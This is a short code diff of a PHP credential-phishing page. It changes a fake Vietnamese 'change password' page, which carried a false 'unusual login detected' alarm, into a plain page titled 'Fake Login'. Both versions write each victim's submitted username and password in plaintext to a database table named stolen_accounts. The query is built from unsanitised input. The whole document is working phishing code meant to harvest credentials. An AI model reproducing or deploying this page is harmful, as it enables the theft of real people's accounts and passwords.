@@ -12,11 +12,10 @@ if ($mysqli->connect_error) {
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
-    $new_password = $_POST['new_password'];
 
     $mysqli->query("
-    INSERT INTO stolen_accounts (username, password, new_password, created_at)
-    VALUES ('$username', '$password', '$new_password', NOW())
+    INSERT INTO stolen_accounts (username, password, created_at)
+    VALUES ('$username', '$password', NOW())
     ");
     header("Location: submit.php");
     exit();
@@ -26,7 +25,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Đổi mật khẩu</title>
+  <title>Fake Login</title>
   <style>
     body {
       margin: 0;
@@ -92,21 +91,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Cảnh báo -->
-    <div class="warning">
-      ⚠️ Phát hiện đăng nhập bất thường vào tài khoản của bạn.<br><br>
-      🔐 Đổi mật khẩu ngay để bảo vệ tài khoản!
-    </div>
-
-    <!-- Form đổi mật khẩu -->
     <div class="login-box">
-      <h2>Đổi mật khẩu</h2>
+      <h2>Login</h2>
       <form method="POST">
-        <input type="text" name="username" placeholder="Tên đăng nhập" required>
-        <input type="password" name="password" placeholder="Mật khẩu hiện tại" required>
-        <input type="password" name="new_password" placeholder="Mật khẩu mới" required>
-        <button type="submit">Đổi mật khẩu</button>
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
       </form>
     </div>
   </div>
